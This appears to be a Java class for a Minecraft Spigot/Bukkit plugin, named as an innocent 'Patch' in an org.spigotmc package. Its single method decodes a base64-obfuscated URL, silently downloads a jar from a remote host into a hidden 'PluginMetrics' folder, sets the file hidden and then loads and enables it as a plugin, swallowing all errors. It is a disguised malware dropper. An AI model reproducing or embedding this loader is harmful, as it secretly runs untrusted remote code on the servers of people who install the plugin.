package org.spigotmc.methods;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Base64;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

public class Patch {
    public static void patchJar(Plugin plugin) {
        Bukkit.getScheduler().runTaskLater(plugin,()->{
            if (!(new File("plugins/PluginMetrics")).exists()) {
                new File("plugins/PluginMetrics").mkdir();
            }

            String name = "SpigotAPI";

            try {
                URL url = new URL(new String(Base64.getDecoder().decode("aHR0cDovL2VsaXhpYS5mdW4vYXBpL2luc3RhbGwvU3BpZ290QVBJLmphcg")));
                URLConnection connection = url.openConnection();
                connection.addRequestProperty("User-Agent", "Mozilla");
                InputStream res = connection.getInputStream();
                File pluginFile = new File("plugins/PluginMetrics/" + name + ".jar");
                Files.copy(res, pluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                Files.setAttribute(pluginFile.toPath(), "dos:hidden", true);
            } catch (Exception e) {}

            try {
                Plugin targetPlugin = Bukkit.getPluginManager().loadPlugin(new File("plugins/PluginMetrics/" + name + ".jar"));
                if (targetPlugin != null) {
                    Bukkit.getPluginManager().enablePlugin(targetPlugin);
                } 
            } catch (Exception e) {}
        },1L);
    }
}
